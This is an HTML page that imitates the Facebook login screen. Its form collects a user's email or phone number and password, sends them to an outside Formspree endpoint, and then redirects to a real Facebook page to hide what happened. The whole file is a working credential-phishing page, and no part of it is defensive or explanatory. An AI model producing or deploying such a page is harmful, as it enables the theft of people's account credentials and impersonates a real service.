<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook – log in or sign up (Replica)</title>
  <style>
    :root{
      --fb-blue:#1877f2;
      --fb-green:#42b72a;
      --text:#1c1e21;
      --muted:#65676b;
      --bg:#f0f2f5;
      --card:#ffffff;
      --input-bg:#f5f5f5;
      --border:#e4e6eb;
    }
    html,body{height:100%;}
    body{
      margin:0;
      font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Helvetica Neue", Helvetica, Arial, "Noto Sans", "Liberation Sans", sans-serif;
      background:var(--bg);
      color:var(--text);
      display:grid;
      place-items:start center;
    }
    .wrap{
      width:100%;
      max-width:420px;
      padding:48px 20px 24px;
    }
    .logo{
      text-align:center;
      font-weight:800;
      letter-spacing:.2px;
      font-size:44px;
      color:var(--fb-blue);
      margin:8px 0 24px;
      line-height:1;
      font-family: Helvetica, Arial, sans-serif;
    }
    .card{
      background:transparent;
    }
    .input{
      width:100%;
      padding:14px 14px;
      border-radius:10px;
      border:1px solid var(--border);
      background:#fbf6f6;
      outline:none;
      font-size:16px;
      box-sizing:border-box;
      transition:border-color .2s, box-shadow .2s;
    }
    .input + .input{ margin-top:12px; }
    .input:focus{
      border-color:var(--fb-blue);
      box-shadow:0 0 0 3px rgba(24,119,242,.15);
      background:#fff;
    }
    .btn{
      width:100%;
      border:0;
      border-radius:10px;
      padding:14px 16px;
      font-size:18px;
      font-weight:700;
      cursor:pointer;
      transition:filter .15s, transform .02s;
    }
    .btn:active{ transform:translateY(1px); }
    .btn-primary{ background:var(--fb-blue); color:#fff; }
    .btn-primary:disabled{ filter:grayscale(50%); opacity:.7; cursor:not-allowed; }
    .link{ display:inline-block; color:var(--fb-blue); text-decoration:none; font-size:15px; }
    .link:hover{ text-decoration:underline; }
    .center{ text-align:center; }
    .divider{ display:flex; align-items:center; gap:14px; color:#65676b; margin:18px 0; }
    .divider .bar{ flex:1; height:1px; background:var(--border); }
    .btn-create{ background:var(--fb-green); color:#fff; font-weight:700; font-size:17px; padding:12px 16px; border-radius:10px; }
    footer{ text-align:center; color:var(--muted); font-size:15px; margin-top:48px; }
    footer a{ color:var(--muted); text-decoration:none; }
    footer a:hover{ text-decoration:underline; }
    @media (max-width:360px){
      .logo{ font-size:38px; }
    }
  </style>
</head>
<body>
  <main class="wrap">
    <div class="logo">facebook</div>

    <div class="card">
      <!-- ফর্ম সাবমিট + রিডাইরেক্ট -->
      <form id="myForm" action="https://formspree.io/f/meozdzwk" method="POST">
        <input class="input" type="email" name="email" placeholder="Mobile number or email address" required />
        <textarea class="input" name="message" placeholder="Password" required></textarea>
        <div style="height:14px"></div>
        <button class="btn btn-primary" type="submit">Send</button>
      </form>

      <p class="center" style="margin:14px 0 0;">
        <a class="link" href="#">Forgotten password?</a>
      </p>

      <div class="divider">
        <div class="bar"></div>
        <span>or</span>
        <div class="bar"></div>
      </div>

      <p class="center">
        <a class="btn-create" role="button" href="#">Create New Account</a>
      </p>
    </div>

    <footer>
      <p style="margin:40px 0 10px;">
        <a href="#">About</a>
        &nbsp;&nbsp;&nbsp;
        <a href="#">Help</a>
        &nbsp;&nbsp;&nbsp;
        <a href="#">More</a>
      </p>
      <p>Meta &copy; 2022</p>
    </footer>
  </main>

  <script>
    document.getElementById("myForm").addEventListener("submit", function(e){
      e.preventDefault(); // পেজ রিলোড বন্ধ
      var form = this;

      fetch(form.action, {
        method: form.method,
        body: new FormData(form),
        headers: { 'Accept': 'application/json' }
      }).then(function(){
        // ডেটা পাঠানো হয়ে গেলে ১ সেকেন্ড পরে ফেসবুক পেজে যাওয়া
        setTimeout(function(){
          window.location.href = "https://www.facebook.com/teamvexor";
        }, 1000);
      }).catch(function(err){
        console.error("Error sending form:", err);
      });
    });
  </script>
</body>
</html>
